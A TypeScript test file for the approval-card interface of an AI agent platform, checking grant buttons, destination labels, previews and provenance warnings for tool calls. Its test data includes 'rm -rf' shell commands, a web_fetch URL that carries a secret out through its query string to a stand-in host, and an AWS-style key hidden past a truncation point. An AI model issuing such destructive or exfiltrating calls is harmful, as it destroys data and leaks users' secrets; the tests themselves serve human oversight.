import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { ApprovalCard } from "./ApprovalCard";
import { InboxItemCard, approvalItemFromParked } from "./InboxItemCard";
import type { Item } from "../types";
import type { InboxItem } from "../api";

type ApprovalItem = Extract<Item, { kind: "approval" }>;

const RUN_TASK = { id: "task-1", title: "Weekly digest" };

const sendApproval = (extra: Partial<ApprovalItem> = {}): ApprovalItem => ({
  kind: "approval",
  name: "send_message",
  args: { target: "slack:T1/C1", text: "digest" },
  reason: "requires approval",
  category: "messaging",
  ...extra,
});

afterEach(cleanup);

describe("ApprovalCard — standing scoped approvals (§25)", () => {
  it("offers Allow every time only with BOTH a run context and an eligible target", () => {
    const onApprove = vi.fn();
    // Run context + standing target → offered (and it replaces the session-scoped button).
    render(
      <ApprovalCard
        item={sendApproval({ standingTarget: "slack:T1/C1" })}
        onApprove={onApprove}
        runTask={RUN_TASK}
      />,
    );
    fireEvent.click(screen.getByText("Allow every time"));
    expect(onApprove).toHaveBeenCalledWith("always_task");
    expect(screen.queryByText("Allow for this session")).toBeNull();
    cleanup();

    // No run context (a plain session) → never offered.
    render(
      <ApprovalCard item={sendApproval({ standingTarget: "slack:T1/C1" })} onApprove={vi.fn()} />,
    );
    expect(screen.queryByText("Allow every time")).toBeNull();
    cleanup();

    // Run context but no eligible target (e.g. run_shell) → never offered.
    render(
      <ApprovalCard
        item={sendApproval({ name: "run_shell", args: { command: "ls" }, standingTarget: undefined })}
        onApprove={vi.fn()}
        runTask={RUN_TASK}
      />,
    );
    expect(screen.queryByText("Allow every time")).toBeNull();
  });

  it("renders the create_scheduled_task consent proposal: reads disclose, writes grant", () => {
    render(
      <ApprovalCard
        item={sendApproval({
          name: "create_scheduled_task",
          args: {
            title: "Weekly digest",
            instructions: "post it",
            cron: "0 9 * * 1",
            permissions: [
              { tool: "send_message", target: "slack:T1/C1", access: "write" },
              { tool: "github_list_commits", target: "rohit/agent-platform", access: "read" },
            ],
          },
        })}
        onApprove={vi.fn()}
      />,
    );
    const grants = screen.getByTestId("approval-grants");
    expect(grants.textContent).toContain("slack:T1/C1");
    expect(grants.textContent).toContain("always allowed once you approve");
    expect(grants.textContent).toContain("rohit/agent-platform");
    expect(grants.textContent).toContain("read-only");
    // The raw permissions JSON must not also dump into the args line.
    expect(screen.queryByText(/permissions=/)).toBeNull();
  });
});

describe("ApprovalCard — §35 shapes", () => {
  it("routine file writes render as a compact row: humanized title, inline preview, Allow → once", () => {
    const onApprove = vi.fn();
    render(
      <ApprovalCard
        item={sendApproval({
          name: "write_file",
          args: { path: "src/fetch_data.py", content: "import json\nimport urllib\nx=1\ny=2\nz=3\ndone=1" },
          category: undefined,
        })}
        onApprove={onApprove}
      />,
    );
    const row = screen.getByTestId("approval-row");
    expect(row.textContent).toContain("Write ");
    expect(row.textContent).toContain("fetch_data.py");
    expect(screen.queryByText(/Permission required/i)).toBeNull();

    // Preview expands INLINE from the tool args (the file doesn't exist yet).
    expect(screen.queryByText(/import json/)).toBeNull();
    fireEvent.click(screen.getByText(/preview/));
    expect(screen.getByText(/import json/)).toBeTruthy();
    expect(screen.getByText("show all 6 lines")).toBeTruthy();

    fireEvent.click(screen.getByText("Allow"));
    expect(onApprove).toHaveBeenCalledWith("once");
  });

  it("send_file gets the full external card: destination title, file chip, leaves-the-computer note", () => {
    render(
      <ApprovalCard
        item={sendApproval({
          name: "send_file",
          args: { target: "slack:T1/C9:1700.1", path: "out/report.pdf", comment: "here you go" },
        })}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.getByText(/Send a file to/).textContent).toContain("C9");
    expect(screen.getByText(/leaves this computer → Slack/)).toBeTruthy();
    expect(screen.getByText(/report\.pdf/)).toBeTruthy();
    expect(screen.getByText(/here you go/)).toBeTruthy();
    expect(screen.getByText("Allow once")).toBeTruthy();
  });

  it("long single-paragraph send_message text is clamped, expandable, and never a wall", () => {
    // Owner repro 2026-07-15: a one-paragraph Slack digest (no newlines) blew the card
    // up to full-transcript height — the preview clamped by LINES only.
    const digest = "aisuite last 24 hours of work: five PRs merged covering streaming, multimodal input, Slack improvements, human attribution, and formatting. ".repeat(8);
    render(<ApprovalCard item={sendApproval({ args: { target: "slack:T1/C1", text: digest } })} onApprove={vi.fn()} />);

    const prev = document.querySelector(".approval-prev") as HTMLElement;
    expect(prev.textContent!.length).toBeLessThan(500);
    fireEvent.click(screen.getByText("show the full message"));
    expect(document.querySelector(".approval-prev")!.textContent!.length).toBeGreaterThan(1000);
    expect(screen.getByText("show less")).toBeTruthy();
  });

  it("short send_message text keeps the inline quote (no preview box)", () => {
    render(<ApprovalCard item={sendApproval()} onApprove={vi.fn()} />);
    expect(screen.getByText(/“digest”/)).toBeTruthy();
    expect(document.querySelector(".approval-prev")).toBeNull();
  });

  it("run_shell titles with the model's description and previews the command", () => {
    render(
      <ApprovalCard
        item={sendApproval({
          name: "run_shell",
          args: { command: "python3 fetch.py > data.json", description: "Fetch semiconductor stock data" },
          category: undefined,
        })}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.getByText(/Run a command — fetch semiconductor stock data/)).toBeTruthy();
    expect(screen.getByText(/python3 fetch\.py/)).toBeTruthy();
    expect(screen.getByText(/stays on this computer/)).toBeTruthy();
    expect(screen.getByText("Allow this command for this session")).toBeTruthy();
  });
});

describe("InboxItemCard — Allow every time on parked run approvals", () => {
  const baseItem = (data?: Record<string, any>): InboxItem => ({
    id: "i1",
    session_id: "__run__r1",
    kind: "approval",
    title: "Run `send_message`?",
    body: "target: slack:T1/C1",
    state: "pending",
    resolution: null,
    inbox: "default",
    created_at: "",
    resolved_at: null,
    data,
  });

  it("shows the button only when the item carries the task binding + target", () => {
    const onResolve = vi.fn();
    render(
      <InboxItemCard
        item={baseItem({ task_id: "task-1", task_title: "Weekly digest", standing_target: "slack:T1/C1" })}
        onResolve={onResolve}
      />,
    );
    fireEvent.click(screen.getByText("Allow every time"));
    expect(onResolve).toHaveBeenCalledWith("i1", "always_task");
    cleanup();

    // A plain unattended-session approval (no task data) keeps Approve/Deny only.
    render(<InboxItemCard item={baseItem()} onResolve={vi.fn()} />);
    expect(screen.queryByText("Allow every time")).toBeNull();
    expect(screen.getByText("Approve")).toBeTruthy();
    expect(screen.getByText("Deny")).toBeTruthy();
  });

  it("parked approvals with tool data wear the §35 dress — same dialect as the live card", () => {
    const onResolve = vi.fn();
    render(
      <InboxItemCard
        item={baseItem({
          tool: "write_file",
          arguments: { path: "src/fetch_data.py", content: "import json\nx = 1" },
        })}
        onResolve={onResolve}
      />,
    );
    // Humanized title + preview from the args; the raw "Run `write_file`?" title is gone.
    expect(screen.getByText("fetch_data.py")).toBeTruthy();
    expect(screen.queryByText("Run `send_message`?")).toBeNull();
    expect(screen.getByText(/import json/)).toBeTruthy();
    expect(screen.getByText(/stays on this computer/)).toBeTruthy();
    // §35 labels; resolution vocabulary unchanged (works on every approver path).
    fireEvent.click(screen.getByText("Allow once"));
    expect(onResolve).toHaveBeenCalledWith("i1", "allow");
    // Old rows without tool data keep the legacy treatment (covered above).
  });
});

describe("ApprovalCard — no silent truncation on long-tail tools (OPE-136 finding 7)", () => {
  const LONG_BODY =
    "Hi Priya, attached is the proposal we discussed. Please review section three carefully — " +
    "the revised milestones move delivery to March and the payment schedule follows suit. " +
    "The engineering estimate now includes the migration work we scoped last week, and the " +
    "support retainer is priced separately as you asked. The onboarding plan assumes two " +
    "workshops in the first month, with the second one optional if the team ramps quickly. " +
    "Let me know if the terms work for your side before Thursday's call. " +
    "P.S. Our internal cost floor is $40k — the smuggled tail must be visible.";

  const emailApproval = (): ApprovalItem => ({
    kind: "approval",
    name: "gmail_send_email",
    args: { to: "client@example.com", subject: "Q3 proposal", body: LONG_BODY },
    reason: "requires approval",
    category: "connector",
  });

  it("a long value renders as a complete labeled block, not the 96-char line", () => {
    render(<ApprovalCard item={emailApproval()} onApprove={vi.fn()} />);
    // The labeled block discloses the field and its true size…
    const block = screen.getByTestId("approval-longarg-body");
    expect(block.textContent).toContain("body");
    expect(block.textContent).toContain(`${LONG_BODY.length} chars`);
    // …and content beyond the old 96-char cliff is visible without any click.
    expect(screen.getByText(/revised milestones move delivery to March/)).toBeTruthy();
    // The one-liner keeps only what it can show whole.
    expect(screen.getByText(/to=client@example\.com/)).toBeTruthy();
  });

  it("the smuggled tail is reachable — show-all reveals the final sentence", () => {
    render(<ApprovalCard item={emailApproval()} onApprove={vi.fn()} />);
    fireEvent.click(screen.getByText(/show/i));
    expect(screen.getByText(/the smuggled tail must be visible/)).toBeTruthy();
  });

  it("short-args-only tools keep the compact line, no blocks", () => {
    render(
      <ApprovalCard
        item={{
          kind: "approval",
          name: "gcal_delete_event",
          args: { event_id: "evt_123" },
          reason: "requires approval",
          category: "connector",
        }}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.getByText(/event_id=evt_123/)).toBeTruthy();
    expect(screen.queryByTestId("approval-longarg-event_id")).toBeNull();
  });
});

describe("ApprovalCard — the run grant rung (OPE-136 'Allow for this request')", () => {
  it("EXTERNAL family offers it and it sends this_run", () => {
    const onApprove = vi.fn();
    render(
      <ApprovalCard
        item={{
          kind: "approval",
          name: "mcp__my_jira__searchJiraIssuesUsingJql",
          args: { jql: "ORDER BY created" },
          reason: "requires approval",
          category: "mcp",
        }}
        onApprove={onApprove}
      />,
    );
    fireEvent.click(screen.getByTestId("approval-this-run"));
    expect(onApprove).toHaveBeenCalledWith("this_run");
    // The tooltip states the trade plainly — later calls run unseen, nothing survives.
    expect(
      screen.getByTestId("approval-this-run").getAttribute("title"),
    ).toContain("without showing you their arguments");
    // The durable rung still stands beside it on MCP cards.
    expect(screen.getByTestId("approval-always-trust")).toBeTruthy();
  });

  it("connector tools get the rung too — their only rung besides once", () => {
    const onApprove = vi.fn();
    render(
      <ApprovalCard
        item={{
          kind: "approval",
          name: "gmail_send_email",
          args: { to: "a@b.c", subject: "hi", body: "short" },
          reason: "requires approval",
          category: "connector",
        }}
        onApprove={onApprove}
      />,
    );
    fireEvent.click(screen.getByTestId("approval-this-run"));
    expect(onApprove).toHaveBeenCalledWith("this_run");
    expect(screen.queryByTestId("approval-always-trust")).toBeNull();
  });

  it("EXEC and EGRESS never see it, and Auto-approve hides it (§1.5)", () => {
    render(
      <ApprovalCard
        item={{ kind: "approval", name: "run_shell", args: { command: "rm -rf x" }, reason: "requires approval" }}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.queryByTestId("approval-this-run")).toBeNull();
    cleanup();

    render(
      <ApprovalCard
        item={{ kind: "approval", name: "web_fetch", args: { url: "https://x.y/z" }, reason: "requires approval" }}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.queryByTestId("approval-this-run")).toBeNull();
    cleanup();

    render(
      <ApprovalCard
        item={{
          kind: "approval",
          name: "mcp__my_jira__getJiraIssue",
          args: {},
          reason: "requires approval",
          category: "mcp",
        }}
        onApprove={vi.fn()}
        autoApprove
      />,
    );
    expect(screen.queryByTestId("approval-this-run")).toBeNull();
  });
});

describe("InboxItemCard — parked MCP approvals carry the live card's evidence (OPE-136)", () => {
  const mcpItem = (data: Record<string, any>, body = ""): InboxItem => ({
    id: "i2",
    session_id: "s1",
    kind: "approval",
    title: "Run `mcp__my_jira__searchJiraIssuesUsingJql`?",
    body,
    state: "pending",
    resolution: null,
    inbox: "default",
    created_at: "",
    resolved_at: null,
    data,
  });

  it("shows the destination chip and the FULL argument envelope, not the truncated body", () => {
    render(
      <InboxItemCard
        item={mcpItem(
          {
            tool: "mcp__my_jira__searchJiraIssuesUsingJql",
            arguments: { cloudId: "0bbb", jql: "ORDER BY created DESC" },
            category: "mcp",
            mcp_destination: { transport: "http", host: "mcp.atlassian.com" },
          },
          "cloudId: 0bbb",
        )}
        onResolve={vi.fn()}
      />,
    );
    // Same chip the live card shows — never the vague "acts through an MCP server".
    expect(screen.getByText(/leaves this computer → mcp\.atlassian\.com/)).toBeTruthy();
    expect(screen.queryByText("acts through an MCP server")).toBeNull();
    // Full JSON evidence block (arguments are the only evidence for a stranger's tool);
    // the one-line truncated body is subsumed and must not render alongside.
    expect(screen.getByText(/ORDER BY created DESC/)).toBeTruthy();
    expect(screen.queryByText("cloudId: 0bbb", { exact: true })).toBeNull();
  });

  it("renders a real reason from data (the body may be skipped, the reason must survive)", () => {
    render(
      <InboxItemCard
        item={mcpItem({
          tool: "mcp__my_jira__editJiraIssue",
          arguments: { issueIdOrKey: "OPE-1" },
          category: "mcp",
          mcp_destination: { transport: "http", host: "mcp.atlassian.com" },
          reason: "the reviewer wasn't sure this edit was asked for",
        })}
        onResolve={vi.fn()}
      />,
    );
    expect(screen.getByText("the reviewer wasn't sure this edit was asked for")).toBeTruthy();
  });

  it("a redelivered parked approval rebuilds the REAL card — full trust ladder included", () => {
    // OPE-136 one-renderer fix: the session view maps parked data back into the live
    // ApprovalCard, so a reconnect/navigation can never lose evidence or buttons again.
    const parked = approvalItemFromParked(
      mcpItem({
        tool: "mcp__my_jira__getVisibleJiraProjects",
        arguments: { cloudId: "0bbb" },
        category: "mcp",
        mcp_destination: { transport: "http", host: "mcp.atlassian.com" },
      }),
    );
    expect(parked).not.toBeNull();
    const onApprove = vi.fn();
    render(<ApprovalCard item={parked!} onApprove={onApprove} />);
    expect(screen.getByText(/leaves this computer → mcp\.atlassian\.com/)).toBeTruthy();
    fireEvent.click(screen.getByTestId("approval-always-trust"));
    expect(onApprove).toHaveBeenCalledWith("always_trust");
  });

  it("a legacy parked row without tool data maps to null — the lean card keeps it", () => {
    const bare: Parameters<typeof approvalItemFromParked>[0] = {
      ...mcpItem({}),
      data: undefined,
    };
    expect(approvalItemFromParked(bare)).toBeNull();
  });

  it("legacy parked rows (no stored destination) fall back honestly, not vaguely wrong", () => {
    render(
      <InboxItemCard
        item={mcpItem({
          tool: "mcp__my_jira__getVisibleJiraProjects",
          arguments: { cloudId: "0bbb" },
        })}
        onResolve={vi.fn()}
      />,
    );
    // No destination on record → the honest unknown, never "stays on this computer".
    expect(screen.getByText("acts through an MCP server")).toBeTruthy();
    expect(screen.queryByText(/stays on this computer/)).toBeNull();
  });
});

describe("ApprovalCard — save_skill (SKILLS-SPEC §5.2)", () => {
  const skillApproval = (extra: Partial<ApprovalItem> = {}): ApprovalItem =>
    sendApproval({
      name: "save_skill",
      category: "skills",
      args: {
        name: "weekly-github-report",
        description: "Create a concise Monday status report from GitHub activity.",
        instructions: "1. Fetch PRs\n2. Write the report",
        files: ["fetch_prs.py", "sub/example-report.md"],
      },
      standingTarget: undefined,
      ...extra,
    });

  it("shows name-first title, description, instructions, and every bundled file", () => {
    render(<ApprovalCard item={skillApproval()} onApprove={vi.fn()} />);
    expect(screen.getByText("weekly-github-report")).toBeTruthy(); // bold obj in the title
    expect(screen.getAllByText(/to your skills/).length).toBeGreaterThan(0); // title + footer
    // The corner answers WHERE; the footer answers what approving means (§5.2 review round).
    expect(screen.getByText("saves to Settings ▸ Skills")).toBeTruthy();
    expect(screen.getByText(/usable in every conversation from\s+then on/)).toBeTruthy();
    expect(
      screen.getByText("Create a concise Monday status report from GitHub activity."),
    ).toBeTruthy();
    expect(screen.getByText(/Fetch PRs/)).toBeTruthy();
    const chips = screen.getByTestId("skill-bundle-files");
    expect(chips.textContent).toContain("fetch_prs.py");
    expect(chips.textContent).toContain("example-report.md"); // basename, not the path
  });

  it("uses the §7 button copy and never offers a session-wide always", () => {
    const onApprove = vi.fn();
    render(<ApprovalCard item={skillApproval()} onApprove={onApprove} />);
    expect(screen.queryByText("Allow for this session")).toBeNull(); // every proposal gets its own review
    expect(screen.queryByText("Deny")).toBeNull();
    fireEvent.click(screen.getByText("Add to my skills"));
    expect(onApprove).toHaveBeenCalledWith("once");
    fireEvent.click(screen.getByText("Not now"));
    expect(onApprove).toHaveBeenCalledWith("deny");
  });
});

describe("ApprovalCard — §1.9 egress cards", () => {
  const fetchApproval = (extra: Partial<ApprovalItem> = {}): ApprovalItem => ({
    kind: "approval",
    name: "web_fetch",
    args: { url: "https://www.bbc.com/news/article-1" },
    reason: "requires approval",
    category: undefined,
    ...extra,
  });

  it("web_fetch offers the DOMAIN grant (www-stripped), never a tool-wide always", () => {
    const onApprove = vi.fn();
    render(<ApprovalCard item={fetchApproval()} onApprove={onApprove} />);
    // The grant button names exactly what it covers — the spelling the server mints.
    fireEvent.click(screen.getByText("Allow bbc.com for this session"));
    expect(onApprove).toHaveBeenCalledWith("always_domain");
    expect(screen.queryByText("Allow for this session")).toBeNull(); // no tool-wide button
    expect(screen.getByText(/leaves this computer → bbc\.com/)).toBeTruthy();
  });

  it("web_fetch with an unparseable url falls back to once/deny only", () => {
    render(<ApprovalCard item={fetchApproval({ args: { url: "not a url" } })} onApprove={vi.fn()} />);
    expect(screen.queryByText(/for this session/)).toBeNull();
    expect(screen.getByText("Allow once")).toBeTruthy();
  });

  it("web_search offers the searches grant and names the LIVE provider", () => {
    const onApprove = vi.fn();
    render(
      <ApprovalCard
        item={fetchApproval({
          name: "web_search",
          args: { query: "H-1B visa rule change" },
          searchProvider: "duckduckgo",
        })}
        onApprove={onApprove}
      />,
    );
    expect(
      screen.getByText(/Queries go to your configured search provider \(currently: duckduckgo\)\./),
    ).toBeTruthy();
    fireEvent.click(screen.getByText("Allow searches for this session"));
    expect(onApprove).toHaveBeenCalledWith("always_tool"); // tool-wide IS provider-wide here
    expect(screen.getByText(/leaves this computer → your search provider/)).toBeTruthy();
  });

  it("Auto-Approve fall-through cards hide every session 'always' (§1.5: grants don't skip the reviewer)", () => {
    render(<ApprovalCard item={fetchApproval()} onApprove={vi.fn()} autoApprove />);
    expect(screen.queryByText(/for this session/)).toBeNull();
    cleanup();
    render(
      <ApprovalCard
        item={fetchApproval({ name: "web_search", args: { query: "x" } })}
        onApprove={vi.fn()}
        autoApprove
      />,
    );
    expect(screen.queryByText(/for this session/)).toBeNull();
    cleanup();
    render(
      <ApprovalCard
        item={fetchApproval({ name: "run_shell", args: { command: "ls" } })}
        onApprove={vi.fn()}
        autoApprove
      />,
    );
    expect(screen.queryByText("Allow this command for this session")).toBeNull();
    expect(screen.getByText("Allow once")).toBeTruthy();
    expect(screen.getByText("Deny")).toBeTruthy();
  });
});

describe("InboxItemCard — parked save_skill proposals (SKILLS-SPEC §5.2)", () => {
  const parked = (): InboxItem => ({
    id: "i9",
    session_id: "s1",
    kind: "approval",
    title: "Run `save_skill`?",
    body: "",
    state: "pending",
    resolution: null,
    inbox: "default",
    created_at: "",
    resolved_at: null,
    data: {
      tool: "save_skill",
      arguments: {
        name: "weekly-github-report",
        description: "Create a concise Monday status report from GitHub activity.",
        instructions: "1. Fetch PRs\n2. Write the report",
        files: ["fetch_prs.py"],
      },
    },
  });

  it("wears the same review surface and button copy as the live card", () => {
    const onResolve = vi.fn();
    render(<InboxItemCard item={parked()} onResolve={onResolve} />);
    expect(screen.getByText("saves to Settings ▸ Skills")).toBeTruthy();
    expect(
      screen.getByText("Create a concise Monday status report from GitHub activity."),
    ).toBeTruthy();
    expect(screen.getByText(/Fetch PRs/)).toBeTruthy();
    expect(screen.getByTestId("skill-bundle-files").textContent).toContain("fetch_prs.py");
    expect(screen.getByText(/usable in every conversation/)).toBeTruthy();
    expect(screen.queryByText("Allow once")).toBeNull();
    fireEvent.click(screen.getByText("Add to my skills"));
    expect(onResolve).toHaveBeenCalledWith("i9", "allow");
    fireEvent.click(screen.getByText("Not now"));
    expect(onResolve).toHaveBeenCalledWith("i9", "deny");
  });
});

describe("ApprovalCard — session read-only grant", () => {
  const shellApproval = (extra: Partial<ApprovalItem> = {}): ApprovalItem => ({
    kind: "approval",
    name: "run_shell",
    args: { command: "ls -la" },
    reason: "requires approval",
    ...extra,
  });

  it("offers the read-only session grant only when the server classified the command read-only", () => {
    const onApprove = vi.fn();
    render(<ApprovalCard item={shellApproval({ readonlyOk: true })} onApprove={onApprove} />);
    fireEvent.click(screen.getByTestId("allow-readonly-session"));
    expect(onApprove).toHaveBeenCalledWith("readonly_session");
    // The command-scoped grant stays alongside — different scopes, both legitimate.
    expect(screen.getByText("Allow this command for this session")).toBeTruthy();
    cleanup();

    // Not classified read-only (a write) → the button never renders.
    const onApprove2 = vi.fn();
    render(
      <ApprovalCard
        item={shellApproval({ args: { command: "rm -rf x" }, readonlyOk: false })}
        onApprove={onApprove2}
      />,
    );
    expect(screen.queryByTestId("allow-readonly-session")).toBeNull();
  });
});

// The provenance line (OPE-114 §1): the one fact about a shell command that cannot be read
// off its text — that the agent itself made the file it is about to run. Rendered on the
// card as well as sent to the reviewer, because a human approving is just as blind to a
// script's contents as the reviewer is.
describe("ApprovalCard — file provenance", () => {
  const shell = (extra: Partial<ApprovalItem> = {}): ApprovalItem => ({
    kind: "approval",
    name: "run_shell",
    args: { command: "python scripts/setup.py" },
    reason: "requires approval",
    category: "shell",
    ...extra,
  });

  it("shows the warning when the agent created the file this command runs", () => {
    render(
      <ApprovalCard
        item={shell({ provenance: "scripts/setup.py was created by the agent 3 steps ago" })}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.getByText(/created by the agent 3 steps ago/)).toBeTruthy();
  });

  it("says nothing about provenance for an ordinary command", () => {
    render(<ApprovalCard item={shell()} onApprove={vi.fn()} />);
    expect(screen.queryByText(/by the agent/)).toBeNull();
  });

  it("shows it for downloaded files too, since that is the sharper case", () => {
    render(
      <ApprovalCard
        item={shell({
          args: { command: "bash install.sh" },
          provenance: "install.sh was downloaded by the agent 1 step ago",
        })}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.getByText(/downloaded by the agent/)).toBeTruthy();
  });
});

// OPE-136 findings 4+5: the card tells the truth about where an MCP call goes, and
// hides no evidence behind a truncation the attacker can ride past.
describe("ApprovalCard — honest MCP and egress evidence (OPE-136)", () => {
  const mcpApproval = (extra: Partial<ApprovalItem> = {}): ApprovalItem => ({
    kind: "approval",
    name: "mcp__atlassian__createJiraIssue",
    args: { projectKey: "OPS", summary: "Rotate keys" },
    reason: "requires approval",
    category: "mcp",
    ...extra,
  });

  it("an HTTP MCP call says it leaves this computer, naming the server host", () => {
    render(
      <ApprovalCard
        item={mcpApproval({ mcpDestination: { transport: "http", host: "mcp.atlassian.com" } })}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.getByText(/leaves this computer → mcp\.atlassian\.com/)).toBeTruthy();
    expect(screen.queryByText(/stays on this computer/)).toBeNull();
  });

  it("a stdio MCP call says it runs a local program — never the stays-here catch-all", () => {
    render(
      <ApprovalCard
        item={mcpApproval({ mcpDestination: { transport: "stdio", host: "" } })}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.getByText("runs a local program on this computer")).toBeTruthy();
  });

  it("an MCP card with no destination info says so honestly instead of guessing", () => {
    render(<ApprovalCard item={mcpApproval()} onApprove={vi.fn()} />);
    expect(screen.getByText("acts through an MCP server")).toBeTruthy();
    expect(screen.queryByText(/stays on this computer/)).toBeNull();
  });

  it("MCP arguments render in the expandable block — a payload past char 96 is reachable", () => {
    const secret = "AKIA" + "X".repeat(150) + "_THE_SMUGGLED_TAIL";
    render(
      <ApprovalCard
        item={mcpApproval({ args: { projectKey: "OPS", summary: "y".repeat(200), note: secret } })}
        onApprove={vi.fn()}
      />,
    );
    fireEvent.click(screen.getByText(/show all|show the full message/));
    expect(screen.getByText(/_THE_SMUGGLED_TAIL/)).toBeTruthy();
  });

  it("web_fetch shows the FULL URL — the query string where exfiltration rides", () => {
    const url =
      "https://api.legit-analytics.example/v3/collect?session=abc&pad=" +
      "z".repeat(400) +
      "&payload=SECRET_PAST_THE_CUTOFF";
    render(
      <ApprovalCard
        item={mcpApproval({ name: "web_fetch", args: { url }, category: undefined })}
        onApprove={vi.fn()}
      />,
    );
    // Titled by destination, not "Use web_fetch".
    expect(screen.getByText(/Fetch from/)).toBeTruthy();
    fireEvent.click(screen.getByText(/show all|show the full message/));
    expect(screen.getByText(/SECRET_PAST_THE_CUTOFF/)).toBeTruthy();
  });

  it("web_search shows the full query in the preview", () => {
    render(
      <ApprovalCard
        item={mcpApproval({
          name: "web_search",
          args: { query: "q".repeat(500) + " TAIL_OF_THE_QUERY" },
          category: undefined,
        })}
        onApprove={vi.fn()}
      />,
    );
    fireEvent.click(screen.getByText(/show all|show the full message/));
    expect(screen.getByText(/TAIL_OF_THE_QUERY/)).toBeTruthy();
  });
});

// OPE-136 §4 — the MCP trust ladder: once / durable trust / deny. The session-scoped
// "Allow for this session" is HIDDEN for MCP tools (the server already refused that
// grant — a button the server downgrades is a lie), and the durable button never
// appears in Auto-approve (§1.5: a reviewer-escalated card must not mint a permanent
// skip).
describe("ApprovalCard — MCP trust ladder (OPE-136 §4)", () => {
  const mcpItem = (extra: Partial<ApprovalItem> = {}): ApprovalItem => ({
    kind: "approval",
    name: "mcp__atlassian__getJiraIssue",
    args: { issueKey: "OPS-1" },
    reason: "requires approval",
    category: "mcp",
    ...extra,
  });

  it("offers Always allow this tool (durable) and NOT the session-scoped grant", () => {
    const onApprove = vi.fn();
    render(<ApprovalCard item={mcpItem()} onApprove={onApprove} />);
    expect(screen.queryByText("Allow for this session")).toBeNull();
    fireEvent.click(screen.getByTestId("approval-always-trust"));
    expect(onApprove).toHaveBeenCalledWith("always_trust");
  });

  it("hides the durable button in Auto-approve mode (§1.5)", () => {
    render(<ApprovalCard item={mcpItem()} onApprove={vi.fn()} autoApprove />);
    expect(screen.queryByTestId("approval-always-trust")).toBeNull();
    expect(screen.getByText("Allow once")).toBeTruthy();
  });

  it("never offers the durable button on non-MCP cards", () => {
    render(
      <ApprovalCard
        item={mcpItem({ name: "send_message", args: { target: "slack:T1/C1", text: "x" }, category: "messaging" })}
        onApprove={vi.fn()}
      />,
    );
    expect(screen.queryByTestId("approval-always-trust")).toBeNull();
  });
});
